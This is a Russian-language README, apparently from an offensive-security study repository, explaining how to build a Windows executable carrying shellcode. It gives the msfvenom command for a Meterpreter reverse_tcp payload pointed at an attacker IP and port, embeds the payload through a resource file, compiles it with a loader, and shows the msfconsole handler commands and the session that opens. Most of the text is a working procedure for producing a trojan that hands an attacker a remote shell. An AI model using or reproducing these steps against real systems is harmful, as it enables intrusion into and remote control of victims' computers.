Шеллкоды
========

В данной директории демонстрируются примеры и опыты с использованием шеллкодов.

Самый простой способ сгенерировать шеллкод - использовать `msfvenom`:

```bash
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.187.128 LPORT=1337 > shellcode.bin
```

Эта команда создает обратную оболочку (reverse shell). LHOST - IP-адрес 
атакующего, LPORT - порт машины атакующего, по которому будет установлено 
соединение.

Полученный двоичный файл с шеллкодом можно встроить в exe-файл при помощи 
[ресурсного файла](https://learn.microsoft.com/en-us/windows/win32/menurc/about-resource-files).

Создадим файл `resources.rc`. Его структура:

```rc
Name Type Filename
```

В нашем случае выйдет что-то вроде:

```rc
Payload PAYLOAD "shellcode.bin"
```

RC-файл скомпилируем в .res при помощи утилиты из набора разработчика Windows 
`rc.exe` (доступна в Developer PowerShell/Command Prompt for VS 20XX):

```powershell
rc.exe /r .\resources.rc
```

На выходе получим файл `resources.res`.

Теперь в коде самой программы нам необходимо найти ресурс в нашем бинаре, 
получить его размер, загрузить его и скопировать в выделенный участок памяти, 
после чего его можно исполнить (см. код `shellinside.c`).

Компиляция при помощи clang:

```powershell
clang shellinside.c resources.res -o shellinside.exe
```

На машине атакующего слушаем входящие соединения:

```bash
$ msfconsole -q
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost <LHOST>
set lport <LPORT>
run
```

Здесь LHOST, LPORT -  те же, что указывались при создании шеллкода.

После запуска скомпилиованного exe-файла с шеллкодом на машине атакующего 
открывается сессия:

```
[*] Meterpreter session 1 opened (X.X.X.X:1337 -> Y.Y.Y.Y:61867) at [...]
```

При наборе команды `shell` атакующий получает командную строку от имени 
пользователя, запустившего вредоносный exe-файл.


### Дополнительные материалы

* [ired.team - Loading and Executing Shellcode From PE Resources](https://www.ired.team/offensive-security/code-injection-process-injection/loading-and-executing-shellcode-from-portable-executable-resources)

* [How to use a reverse shell in Metasploit](https://adfoster-r7.github.io/metasploit-framework/docs/using-metasploit/basics/how-to-use-a-reverse-shell-in-metasploit.html)

* [CPP / C++ - Embed Resources Into Executables](https://caiorss.github.io/C-Cpp-Notes/resources-executable.html)

* [Embedding binary data with Windows Resource Compiler](https://macoy.me/blog/programming/WindowsResourceCompiler)

* [The Inner Working of FindResource() and LoadString() Win32 Functions](https://www.codeproject.com/Articles/431045/The-Inner-Working-of-FindResource-and-LoadString-W)